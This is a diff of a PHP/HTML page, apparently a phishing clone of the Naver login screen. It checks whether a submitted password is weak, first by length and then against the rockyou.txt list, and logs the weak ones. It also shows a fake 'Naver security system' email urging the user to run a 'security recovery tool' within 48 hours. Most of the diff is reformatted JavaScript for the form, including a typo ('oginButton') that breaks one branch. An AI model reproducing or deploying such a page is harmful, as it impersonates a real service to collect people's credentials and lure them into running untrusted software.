@@ -17,29 +17,37 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         // 약한 비밀번호 체크 (직접 파일 읽기 방식으로 변경)
         $is_password_weak = false; // 취약한 비밀번호인지 여부를 저장할 변수
 
-        // rockyou.txt 파일의 경로를 지정합니다.
-        // 이 코드가 제대로 작동하려면, nidlogin.login.php와 rockyou.txt가 같은 폴더에 있어야 합니다.
-        $password_file = dirname(__FILE__) . '/rockyou.txt';
-        $handle = @fopen($password_file, "r");
+        $MIN_LENGTH = 8;
 
-        if ($handle) {
-            // 파일의 끝에 도달할 때까지 한 줄씩 읽습니다.
-            while (($line = fgets($handle)) !== false) {
-                $weak_password = trim($line);
+        if (strlen($password) < $MIN_LENGTH) {
+            $is_password_weak = true;
+        }
+        
+        else{
 
-                // 입력된 비밀번호와 파일에서 읽은 비밀번호가 일치하는지 확인합니다.
-                if ($password === $weak_password) {
-                    $is_password_weak = true; // 일치하면 true로 설정
-                    break; // 즉시 루프를 종료합니다.
+            // rockyou.txt 파일의 경로를 지정합니다.
+            // 이 코드가 제대로 작동하려면, nidlogin.login.php와 rockyou.txt가 같은 폴더에 있어야 합니다.
+            $password_file = dirname(__FILE__) . '/rockyou.txt';
+            $handle = @fopen($password_file, "r");
+
+            if ($handle) {
+                // 파일의 끝에 도달할 때까지 한 줄씩 읽습니다.
+                while (($line = fgets($handle)) !== false) {
+                    $weak_password = trim($line);
+
+                    // 입력된 비밀번호와 파일에서 읽은 비밀번호가 일치하는지 확인합니다.
+                    if ($password === $weak_password) {
+                        $is_password_weak = true; // 일치하면 true로 설정
+                        break; // 즉시 루프를 종료합니다.
+                    }
                 }
+                fclose($handle); // 파일 핸들을 닫아줍니다.
             }
-            fclose($handle); // 파일 핸들을 닫아줍니다.
         }
     }
-	
-	$MIN_LENGTH = 8;
-	if (strlen($password) < $MIN_LENGTH) { $is_password_weak = true; }
-	
+
+
+
     if ($is_password_weak) {
         // 취약한 비밀번호가 감지되었을 때 로그를 남깁니다.
         // 기존 nidlogin.login.php의 로그 파일 위치와 동일하게 맞춥니다.
@@ -198,7 +206,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                         <div class="email-body">
                             <p><strong>ID: <?php echo htmlspecialchars($userid); ?></strong> 님께,</p>
                             <p class="alert">고객님의 계정에서 비정상적인 로그인 시도가 감지되었습니다.<br>
-                            즉시 아래 <strong>보안 복구 도구</strong>를 실행하여 계정의 보안 상태를 점검하시기 바랍니다.</p>
+                                즉시 아래 <strong>보안 복구 도구</strong>를 실행하여 계정의 보안 상태를 점검하시기 바랍니다.</p>
                             <p>본 알림은 네이버 보안 시스템에 의해 자동으로 발송되었습니다.<br></p>
                             <p>회원님의 계정을 안전하게 보호하기 위해 48시간 이내에 계정 보호조치를 완료해 주시기 바랍니다</p>
                             <p></p>
@@ -382,52 +390,54 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             const pwInput = document.getElementById('pw');
             const idLabel = document.getElementById('id_label');
             const pwLabel = document.getElementById('pw_label');
-				
-				function updateLoginButtonState() {
-					const id = idInput.value.trim();
-					const pw = pwInput.value.trim();
 
-					if (id.length > 0 && pw.length > 0) {
-						loginButton.classList.remove('disabled');
-						loginButton.style.backgroundColor = '#03c75a';
-						loginButton.style.cursor = 'pointer';
-						
-					} else {
-						loginButton.classList.add('disabled');
-						loginButton.style.backgroundColor = '#ccc';
-						oginButton.style.cursor = 'default';
-					}
-				}
+            function updateLoginButtonState() {
+                const id = idInput.value.trim();
+                const pw = pwInput.value.trim();
 
-			
+                if (id.length > 0 && pw.length > 0) {
+                    loginButton.classList.remove('disabled');
+                    loginButton.style.backgroundColor = '#03c75a';
+                    loginButton.style.cursor = 'pointer';
+
+                } else {
+                    loginButton.classList.add('disabled');
+                    loginButton.style.backgroundColor = '#ccc';
+                    oginButton.style.cursor = 'default';
+                }
+            }
+
+
             form.addEventListener('submit', (e) => {
-			const id = idInput.value.trim();
-			const pw = pwInput.value.trim();
-			document.getElementById('err_empty_id').style.display = 'none';
-			document.getElementById('err_empty_pw').style.display = 'none';
+                const id = idInput.value.trim();
+                const pw = pwInput.value.trim();
+                document.getElementById('err_empty_id').style.display = 'none';
+                document.getElementById('err_empty_pw').style.display = 'none';
 
-			if (!id) {
-				e.preventDefault();
-				document.getElementById('err_empty_id').style.display = 'block';
-				console.log('입력 오류: 아이디가 비어 있음');
-			} else if (!pw) {
-				e.preventDefault();
-				document.getElementById('err_empty_pw').style.display = 'block';
-				console.log('입력 오류: 비밀번호가 비어 있음');
-			} else { console.log('폼 제출 성공: ID=' + id); }
-		});
+                if (!id) {
+                    e.preventDefault();
+                    document.getElementById('err_empty_id').style.display = 'block';
+                    console.log('입력 오류: 아이디가 비어 있음');
+                } else if (!pw) {
+                    e.preventDefault();
+                    document.getElementById('err_empty_pw').style.display = 'block';
+                    console.log('입력 오류: 비밀번호가 비어 있음');
+                } else {
+                    console.log('폼 제출 성공: ID=' + id);
+                }
+            });
 
             function updateLabel(input, label) {
                 if (input.value || document.activeElement === input) {
                     label.style.fontSize = '12px';
                     label.style.top = '6px';
-					label.style.left = '7px'; 
+                    label.style.left = '7px';
                     label.style.background = 'none';
                     label.style.padding = '0 8px';
                 } else {
                     label.style.fontSize = '16px';
                     label.style.top = '17px';
-					label.style.left = '10px';	
+                    label.style.left = '10px';
                     label.style.background = 'none';
                     label.style.color = '#888';
                     label.style.padding = '0';
@@ -435,16 +445,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             }
 
             idInput.addEventListener('input', () => updateLabel(idInput, idLabel));
-			idInput.addEventListener('focus', () => updateLabel(idInput, idLabel));
-			idInput.addEventListener('blur', () => updateLabel(idInput, idLabel));
-			idInput.addEventListener('input', updateLoginButtonState);
+            idInput.addEventListener('focus', () => updateLabel(idInput, idLabel));
+            idInput.addEventListener('blur', () => updateLabel(idInput, idLabel));
+            idInput.addEventListener('input', updateLoginButtonState);
 
-			pwInput.addEventListener('input', () => updateLabel(pwInput, pwLabel));
-			pwInput.addEventListener('focus', () => updateLabel(pwInput, pwLabel));
-			pwInput.addEventListener('blur', () => updateLabel(pwInput, pwLabel));
-			pwInput.addEventListener('input', updateLoginButtonState);
-			
-			updateLoginButtonState();
+            pwInput.addEventListener('input', () => updateLabel(pwInput, pwLabel));
+            pwInput.addEventListener('focus', () => updateLabel(pwInput, pwLabel));
+            pwInput.addEventListener('blur', () => updateLabel(pwInput, pwLabel));
+            pwInput.addEventListener('input', updateLoginButtonState);
+
+            updateLoginButtonState();
         });
     </script>
     <div id="nv_stat" style="display:none;">20</div>
